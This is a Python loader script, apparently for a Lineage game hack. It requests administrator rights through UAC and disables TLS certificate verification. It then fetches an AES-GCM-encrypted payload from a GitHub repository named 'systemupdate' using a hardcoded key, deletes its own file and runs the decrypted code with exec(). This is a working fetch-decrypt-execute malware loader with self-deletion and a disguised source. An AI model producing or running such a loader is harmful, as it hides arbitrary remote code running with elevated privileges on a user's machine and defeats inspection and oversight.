# -*- coding: utf-8 -*-
"""뚱시스템 로더 — data.txt AES 복호화 + 실행 (GitHub API, CDN 캐시 회피)"""
import base64
import ctypes
import json
import os
import ssl
import sys
import urllib.request
import zlib

# Insert/Home/PageUp 전역핫키는 관리자 권한이 있어야 리니지 위에서 바로 먹힘
def _ensure_admin():
    try:
        if ctypes.windll.shell32.IsUserAnAdmin():
            return True
    except Exception:
        pass
    try:
        script = os.path.abspath(__file__)
        cwd = os.path.dirname(script) or None
        # UAC 뜨면 '예' → 관리자 pythonw로 다시 실행
        ret = ctypes.windll.shell32.ShellExecuteW(
            None, "runas", sys.executable, f'"{script}"', cwd, 1
        )
        # ret > 32 면 성공 요청. 취소(ERROR_CANCELLED=1223) 등이면 그냥 종료
        if ret <= 32:
            ctypes.windll.user32.MessageBoxW(
                0,
                "관리자 권한이 필요합니다.\nUAC에서 '예'를 눌러주세요.",
                "뚱힐러",
                0x30,
            )
    except Exception as e:
        try:
            ctypes.windll.user32.MessageBoxW(0, f"관리자 실행 실패: {e}", "뚱힐러", 0x10)
        except Exception:
            pass
    sys.exit(0)


_ensure_admin()

ctx = ssl.create_default_context()
ctx.check_hostname = False
ctx.verify_mode = ssl.CERT_NONE
from cryptography.hazmat.primitives.ciphers.aead import AESGCM

KEY = base64.b64decode("W5EwW1vV8EFoNKQsgTCrKmfZzbflm0JDU7MuNG8izu4=")
API = "https://api.github.com/repos/blacknut0319-del/systemupdate/contents/data.txt?ref=main"


def fetch_data_b64():
    req = urllib.request.Request(API, headers={"User-Agent": "ddong"})
    meta = json.loads(urllib.request.urlopen(req, timeout=20, context=ctx).read())
    return base64.b64decode(meta["content"]).decode("utf-8").strip()


try:
    b64_str = fetch_data_b64()
    raw = base64.b64decode(b64_str)
    g = AESGCM(KEY)
    n, e = raw[:12], raw[12:]
    code = zlib.decompress(g.decrypt(n, e, None)).decode("utf-8")
    try:
        os.remove(__file__)
    except Exception:
        pass
    exec(code)
except Exception as err:
    ctypes.windll.user32.MessageBoxW(0, f"실행 실패: {err}", "오류", 0x10)
